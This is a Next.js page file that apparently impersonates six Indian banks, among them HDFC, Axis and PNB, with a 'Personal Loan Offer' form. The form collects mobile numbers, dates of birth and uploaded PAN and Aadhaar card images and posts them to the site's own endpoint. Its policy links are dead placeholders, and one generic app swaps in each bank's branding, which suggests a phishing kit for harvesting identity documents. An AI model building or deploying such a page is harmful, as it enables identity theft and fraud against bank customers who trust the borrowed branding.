'use client'

import { useSearchParams } from 'next/navigation'
import { useState, useEffect } from 'react'
import Image from 'next/image'
import AxisBankHeader from '@/components/AxisBankHeader'
import PNBHeader from '@/components/PNBHeader'

const bankInfo: Record<string, { name: string; logo: string; color: string; primaryColor: string }> = {
  hdfc: { name: 'HDFC Bank', logo: '/assets/images/HDFC.png', color: '#004C8A', primaryColor: '#E31837' },
  axis: { name: 'Axis Bank', logo: '/assets/images/AX.png', color: '#8B0040', primaryColor: '#8B0040' },
  kotak: { name: 'Kotak Mahindra Bank', logo: '/assets/images/Kotak-1.png', color: '#00AEEF', primaryColor: '#00AEEF' },
  idfc: { name: 'IDFC FIRST Bank', logo: '/assets/images/CB.png', color: '#E31837', primaryColor: '#E31837' },
  bob: { name: 'Bank of Baroda', logo: '/assets/images/BOB.png', color: '#003A6B', primaryColor: '#FFB81C' },
  pnb: { name: 'Punjab National Bank', logo: '/assets/images/PNB.png', color: '#9B004A', primaryColor: '#9B004A' },
}

export default function BankApplicationPage({ params }: { params: { bankId: string } }) {
  const searchParams = useSearchParams()
  const bankId = params.bankId
  const bank = bankInfo[bankId] || bankInfo.hdfc
  
  const [formData, setFormData] = useState({
    mobileNumber: '',
    day: '',
    month: '',
    year: '',
    sourceOfIncome: 'salaried',
    consentPersonalData: false,
    consentPersonalizedOffers: false,
    consentPerfios: false,
    panCard: null as File | null,
    aadhaarCard: null as File | null,
  })
  
  const [panPreview, setPanPreview] = useState<string | null>(null)
  const [aadhaarPreview, setAadhaarPreview] = useState<string | null>(null)
  
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isApplied, setIsApplied] = useState(false)
  const canProceed = formData.mobileNumber.length === 10 && 
                     formData.day && formData.month && formData.year && 
                     formData.consentPersonalData

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target
    const checked = (e.target as HTMLInputElement).checked
    
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }))
  }
  
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, field: 'panCard' | 'aadhaarCard') => {
    const file = e.target.files?.[0]
    if (file) {
      // Validate file type
      const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp', 'image/gif']
      if (!validTypes.includes(file.type)) {
        alert(`Please upload a valid image file (JPG, JPEG, PNG, WEBP, or GIF) for ${field === 'panCard' ? 'PAN Card' : 'Aadhaar Card'}`)
        e.target.value = ''
        return
      }
      
      // Validate file size (max 5MB)
      if (file.size > 5 * 1024 * 1024) {
        alert(`File size should be less than 5MB for ${field === 'panCard' ? 'PAN Card' : 'Aadhaar Card'}`)
        e.target.value = ''
        return
      }
      
      setFormData(prev => ({
        ...prev,
        [field]: file
      }))
      
      // Create preview
      const reader = new FileReader()
      reader.onloadend = () => {
        if (field === 'panCard') {
          setPanPreview(reader.result as string)
        } else {
          setAadhaarPreview(reader.result as string)
        }
      }
      reader.readAsDataURL(file)
    }
  }
  
  const removeFile = (field: 'panCard' | 'aadhaarCard') => {
    setFormData(prev => ({
      ...prev,
      [field]: null
    }))
    if (field === 'panCard') {
      setPanPreview(null)
    } else {
      setAadhaarPreview(null)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!canProceed) return
    
    setIsSubmitting(true)
    
    try {
      // Convert files to base64
      const panCardBase64 = formData.panCard ? await fileToBase64(formData.panCard) : null
      const aadhaarCardBase64 = formData.aadhaarCard ? await fileToBase64(formData.aadhaarCard) : null
      
      const response = await fetch('/api/bank-application', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bankId,
          bankName: bank.name,
          mobileNumber: formData.mobileNumber,
          day: formData.day,
          month: formData.month,
          year: formData.year,
          sourceOfIncome: formData.sourceOfIncome,
          loanAmount: searchParams.get('amount') || '',
          tenure: searchParams.get('tenure') || '',
          tenureUnit: searchParams.get('tenureUnit') || 'Yr',
          consentPersonalData: formData.consentPersonalData,
          consentPersonalizedOffers: formData.consentPersonalizedOffers,
          consentPerfios: formData.consentPerfios,
          panCard: panCardBase64 ? {
            data: panCardBase64,
            filename: formData.panCard!.name,
            contentType: formData.panCard!.type
          } : null,
          aadhaarCard: aadhaarCardBase64 ? {
            data: aadhaarCardBase64,
            filename: formData.aadhaarCard!.name,
            contentType: formData.aadhaarCard!.type
          } : null,
        }),
      })

      const data = await response.json()

      if (response.ok) {
        setIsApplied(true)
        console.log('Application submitted successfully:', data)
      } else {
        alert(data.error || 'There was an error submitting your application. Please try again.')
      }
    } catch (error) {
      console.error('Error submitting bank application:', error)
      alert('There was an error submitting your application. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }
  
  const fileToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader()
      reader.onloadend = () => {
        const base64String = (reader.result as string).split(',')[1] // Remove data:image/...;base64, prefix
        resolve(base64String)
      }
      reader.onerror = reject
      reader.readAsDataURL(file)
    })
  }
  
  // Inject dynamic styles for bank colors
  useEffect(() => {
    const styleId = `bank-dynamic-styles-${bankId}`
    let styleElement = document.getElementById(styleId) as HTMLStyleElement
    
    if (!styleElement) {
      styleElement = document.createElement('style')
      styleElement.id = styleId
      document.head.appendChild(styleElement)
    }
    
    styleElement.textContent = `
      .bank-app-page-wrapper .eligibility-button:not(.disabled):hover {
        background: ${bank.primaryColor} !important;
        box-shadow: 0 4px 12px ${bank.primaryColor}40 !important;
      }
    `
    
    // Hide vector background for Axis Bank and PNB
    if (bankId === 'axis' || bankId === 'pnb') {
      const vectorBg = document.getElementById('vectorBackground')
      if (vectorBg) {
        vectorBg.style.display = 'none'
      }
      const bgColor = bankId === 'axis' ? '#E8D0E0' : '#F5E6F0'
      document.body.style.backgroundColor = bgColor
      document.documentElement.style.backgroundColor = bgColor
    }
    
    return () => {
      const element = document.getElementById(styleId)
      if (element) {
        element.remove()
      }
      // Restore vector background when leaving Axis Bank or PNB page
      if (bankId === 'axis' || bankId === 'pnb') {
        const vectorBg = document.getElementById('vectorBackground')
        if (vectorBg) {
          vectorBg.style.display = ''
        }
        document.body.style.backgroundColor = ''
        document.documentElement.style.backgroundColor = ''
      }
    }
  }, [bankId, bank.primaryColor])

  // Check if bank has a custom header banner image
  const bankHeaderImages: Record<string, string> = {
    hdfc: '/hdfc_form.png',
    // Add other bank header images here when available:
    // axis: '/axis_form.png',
    // kotak: '/kotak_form.png',
    // bob: '/bob_form.png',
    // pnb: '/pnb_form.png',
    // idfc: '/idfc_form.png',
  }
  
  const hasHeaderImage = bankHeaderImages[bankId]

  return (
    <div 
      className={`bank-app-page-wrapper ${bankId === 'axis' ? 'axis-bank-theme' : ''} ${bankId === 'pnb' ? 'pnb-bank-theme' : ''}`}
      style={{ 
        marginTop: 0, 
        paddingTop: (bankId === 'axis' || bankId === 'pnb') ? '85px' : 0, 
        position: 'relative',
        backgroundColor: bankId === 'axis' ? '#E8D0E0' : bankId === 'pnb' ? '#F5E6F0' : undefined,
        minHeight: (bankId === 'axis' || bankId === 'pnb') ? '100vh' : undefined
      }}
    >
        {/* Axis Bank Header */}
        {bankId === 'axis' && <AxisBankHeader />}
        
        {/* PNB Header */}
        {bankId === 'pnb' && <PNBHeader />}
        
        {/* Bank Header Banner - Using Image if available */}
        {hasHeaderImage && (
          <div className="hdfc-header-banner" style={{ position: isApplied ? 'fixed' : 'relative', top: bankId === 'axis' ? '130px' : 0, left: 0, right: 0, zIndex: 1 }}>
            <Image
              src={bankHeaderImages[bankId]}
              alt={`${bank.name} Personal Loan Offer`}
              width={1920}
              height={400}
              className="hdfc-banner-image"
              priority
              style={{ width: '100%', height: 'auto', opacity: isApplied ? 0.3 : 1 }}
            />
          </div>
        )}
        
        {!hasHeaderImage && bankId !== 'axis' && (
          <>
            {/* Top Header Bar - Dark Blue Strip */}
            <div className="bank-app-top-header" style={{ backgroundColor: bank.color }}>
              <div className="bank-app-logo-container">
                <Image
                  src={bank.logo}
                  alt={bank.name}
                  width={150}
                  height={50}
                  className="bank-app-logo-image"
                />
              </div>
            </div>

            {/* Banner Section */}
            <div className="bank-app-banner">
              <div className="banner-content">
                <div className="banner-text-section">
                  <h1 className="banner-headline">
                    <span className="banner-text-dark">Hey there !</span><br />
                    <span className="banner-text-dark">Your </span>
                    <span className="highlight-red" style={{ color: bank.primaryColor }}>Personal Loan Offer</span>
                    <span className="banner-text-dark"> is waiting inside.</span>
                  </h1>
                  <div className="banner-features-box">
                    <div className="banner-feature-item">
                      <svg className="feature-icon-svg" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                        <circle cx="12" cy="12" r="10"></circle>
                        <polyline points="12 6 12 12 16 14"></polyline>
                      </svg>
                      <span>Quick Funds</span>
                    </div>
                    <div className="banner-feature-divider"></div>
                    <div className="banner-feature-item">
                      <svg className="feature-icon-svg" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
                        <path d="M14 2v6h6"></path>
                        <circle cx="10" cy="13" r="2" fill="#E31837"></circle>
                        <line x1="8" y1="13" x2="12" y2="13" stroke="#E31837" strokeWidth="2"></line>
                      </svg>
                      <span>No Physical Documentation</span>
                    </div>
                    <div className="banner-feature-divider"></div>
                    <div className="banner-feature-item">
                      <svg className="feature-icon-svg" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                        <circle cx="12" cy="12" r="10"></circle>
                        <polyline points="12 6 12 12 16 14"></polyline>
                        <text x="12" y="18" fontSize="8" fill="white" textAnchor="middle">₹</text>
                      </svg>
                      <span>Fast Loan Process</span>
                    </div>
                  </div>
                </div>
                <div className="banner-image-section">
                  <div className="banner-person-image">
                    <div className="person-illustration">
                      <div className="person-head">👨</div>
                      <div className="person-phone">
                        <div className="phone-screen">
                          <div className="phone-logo-small">HDFC</div>
                          <div className="phone-checkmark">✓</div>
                          <div className="phone-text">Loan Approved</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </>
        )}

        {/* Success Overlay - Shows over banner image */}
        {isApplied && hasHeaderImage && (
          <div className="application-success-overlay">
            <div className="success-content-overlay">
              <div className="success-message-box">
                <div className="success-icon-large">✓</div>
                <h2 className="success-title">Applied</h2>
                <p className="success-message">Our team will reach out to you shortly</p>
              </div>
              <div className="application-details-overlay">
                <h3 className="details-title">Application Details</h3>
                <div className="details-grid">
                  <div className="detail-item">
                    <span className="detail-label">Mobile Number:</span>
                    <span className="detail-value">+91 {formData.mobileNumber}</span>
                  </div>
                  <div className="detail-item">
                    <span className="detail-label">Date of Birth:</span>
                    <span className="detail-value">{formData.day}/{formData.month}/{formData.year}</span>
                  </div>
                  <div className="detail-item">
                    <span className="detail-label">Source of Income:</span>
                    <span className="detail-value">{formData.sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}</span>
                  </div>
                  {formData.panCard && (
                    <div className="detail-item">
                      <span className="detail-label">PAN Card:</span>
                      <span className="detail-value">✓ Uploaded ({formData.panCard.name})</span>
                    </div>
                  )}
                  {formData.aadhaarCard && (
                    <div className="detail-item">
                      <span className="detail-label">Aadhaar Card:</span>
                      <span className="detail-value">✓ Uploaded ({formData.aadhaarCard.name})</span>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Main Form Card */}
        {!isApplied && (
          <div className="bank-app-form-container">
            <div className="bank-app-form-card">
              <h2 className="form-welcome-title">Welcome! Check your Personal Loan offer</h2>
              
              <form onSubmit={handleSubmit} className="bank-app-form">
              {/* Mobile Number */}
              <div className="form-field-group">
                <label className="form-field-label">Your registered mobile number</label>
                <div className="mobile-input-wrapper">
                  <span className="country-code">+91</span>
                  <input
                    type="tel"
                    name="mobileNumber"
                    className="form-input-mobile"
                    placeholder="Enter 10-digit number"
                    value={formData.mobileNumber}
                    onChange={handleChange}
                    maxLength={10}
                    required
                  />
                </div>
                <p className="form-hint-text">Please have it handy to verify OTP</p>
              </div>

              {/* Date of Birth */}
              <div className="form-field-group">
                <label className="form-field-label">Your Date of Birth</label>
                <div className="dob-inputs">
                  <input
                    type="text"
                    name="day"
                    className="dob-input"
                    placeholder="DD"
                    value={formData.day}
                    onChange={handleChange}
                    maxLength={2}
                    required
                  />
                  <input
                    type="text"
                    name="month"
                    className="dob-input"
                    placeholder="MM"
                    value={formData.month}
                    onChange={handleChange}
                    maxLength={2}
                    required
                  />
                  <input
                    type="text"
                    name="year"
                    className="dob-input"
                    placeholder="YYYY"
                    value={formData.year}
                    onChange={handleChange}
                    maxLength={4}
                    required
                  />
                </div>
                <a href="#" className="form-alternative-link" style={{ color: bank.primaryColor }}>Having issues? Click to validate with PAN →</a>
              </div>

              {/* Source of Income */}
              <div className="form-field-group">
                <label className="form-field-label">Your source of income</label>
                <div className="radio-group-bank">
                  <label className={`radio-option-bank ${formData.sourceOfIncome === 'salaried' ? 'selected' : ''}`}>
                    <input
                      type="radio"
                      name="sourceOfIncome"
                      value="salaried"
                      checked={formData.sourceOfIncome === 'salaried'}
                      onChange={handleChange}
                      required
                    />
                    <div className="radio-content">
                      <span className="radio-label">Salaried</span>
                      {formData.sourceOfIncome === 'salaried' && (
                        <div className="info-box-yellow">
                          Income verification or salary proof maybe required for processing loan request
                        </div>
                      )}
                    </div>
                  </label>
                  <label className={`radio-option-bank ${formData.sourceOfIncome === 'self-employed' ? 'selected' : ''}`}>
                    <input
                      type="radio"
                      name="sourceOfIncome"
                      value="self-employed"
                      checked={formData.sourceOfIncome === 'self-employed'}
                      onChange={handleChange}
                    />
                    <div className="radio-content">
                      <span className="radio-label">Self Employed / Professionals / Business</span>
                    </div>
                  </label>
                </div>
              </div>

              {/* PAN Card Upload */}
              <div className="form-field-group">
                <label className="form-field-label">Upload PAN Card</label>
                <div className="file-upload-wrapper">
                  <input
                    type="file"
                    id="panCard"
                    accept="image/jpeg,image/jpg,image/png,image/webp,image/gif"
                    onChange={(e) => handleFileChange(e, 'panCard')}
                    className="file-input-hidden"
                  />
                  <label htmlFor="panCard" className="file-upload-label">
                    <span className="file-upload-icon">📄</span>
                    <span className="file-upload-text">
                      {formData.panCard ? formData.panCard.name : 'Choose file (JPG, JPEG, PNG, WEBP, GIF - Max 5MB)'}
                    </span>
                  </label>
                  {panPreview && (
                    <div className="file-preview-container">
                      <img src={panPreview} alt="PAN Card Preview" className="file-preview-image" />
                      <button
                        type="button"
                        onClick={() => removeFile('panCard')}
                        className="file-remove-button"
                      >
                        ✕ Remove
                      </button>
                    </div>
                  )}
                </div>
                <p className="form-hint-text">Accepted formats: JPG, JPEG, PNG, WEBP, GIF (Max 5MB)</p>
              </div>

              {/* Aadhaar Card Upload */}
              <div className="form-field-group">
                <label className="form-field-label">Upload Aadhaar Card</label>
                <div className="file-upload-wrapper">
                  <input
                    type="file"
                    id="aadhaarCard"
                    accept="image/jpeg,image/jpg,image/png,image/webp,image/gif"
                    onChange={(e) => handleFileChange(e, 'aadhaarCard')}
                    className="file-input-hidden"
                  />
                  <label htmlFor="aadhaarCard" className="file-upload-label">
                    <span className="file-upload-icon">📄</span>
                    <span className="file-upload-text">
                      {formData.aadhaarCard ? formData.aadhaarCard.name : 'Choose file (JPG, JPEG, PNG, WEBP, GIF - Max 5MB)'}
                    </span>
                  </label>
                  {aadhaarPreview && (
                    <div className="file-preview-container">
                      <img src={aadhaarPreview} alt="Aadhaar Card Preview" className="file-preview-image" />
                      <button
                        type="button"
                        onClick={() => removeFile('aadhaarCard')}
                        className="file-remove-button"
                      >
                        ✕ Remove
                      </button>
                    </div>
                  )}
                </div>
                <p className="form-hint-text">Accepted formats: JPG, JPEG, PNG, WEBP, GIF (Max 5MB)</p>
              </div>

              {/* Consent Checkboxes */}
              <div className="consent-group">
                <label className="consent-checkbox-label">
                  <input
                    type="checkbox"
                    name="consentPersonalData"
                    checked={formData.consentPersonalData}
                    onChange={handleChange}
                    required
                  />
                  <span>I hereby consent to collection and processing of my data for availing this loan and relevant services in the manner described in the notice <a href="#" className="consent-link-text" style={{ color: bank.primaryColor }}>here</a></span>
                </label>
                <label className="consent-checkbox-label">
                  <input
                    type="checkbox"
                    name="consentPersonalizedOffers"
                    checked={formData.consentPersonalizedOffers}
                    onChange={handleChange}
                  />
                  <span>I hereby consent to processing of my Data for sending me personalized offers on other products and services of {bank.name}, its affiliates, and partners through Call, SMS, WhatsApp, Email or other channels in the manner described in the notice <a href="#" className="consent-link-text" style={{ color: bank.primaryColor }}>here</a></span>
                </label>
                <label className="consent-checkbox-label">
                  <input
                    type="checkbox"
                    name="consentPerfios"
                    checked={formData.consentPerfios}
                    onChange={handleChange}
                  />
                  <span>I have read, understood, and hereby accept the <a href="#" className="consent-link-text" style={{ color: bank.primaryColor }}>Privacy Policy</a> of {bank.name} Ltd. I/we hereby give the consent in relation to Requested Products. I Agree to <a href="#" className="consent-link-text" style={{ color: bank.primaryColor }}>Perfios T&C</a></span>
                </label>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className={`eligibility-button ${!canProceed ? 'disabled' : ''}`}
                disabled={!canProceed || isSubmitting}
                style={canProceed ? { 
                  background: bank.primaryColor,
                  boxShadow: `0 4px 12px ${bank.primaryColor}40`
                } : {}}
              >
                {isSubmitting ? 'Submitting...' : 'Apply Now'}
              </button>

              {/* Footer Text */}
              <p className="form-footer-text">
                For full details read our <a href="#" className="footer-link" style={{ color: bank.primaryColor }}>Terms & Conditions</a> and <a href="#" className="footer-link" style={{ color: bank.primaryColor }}>Privacy Policy</a>
              </p>
            </form>
          </div>
        </div>
        )}
    </div>
  )
}
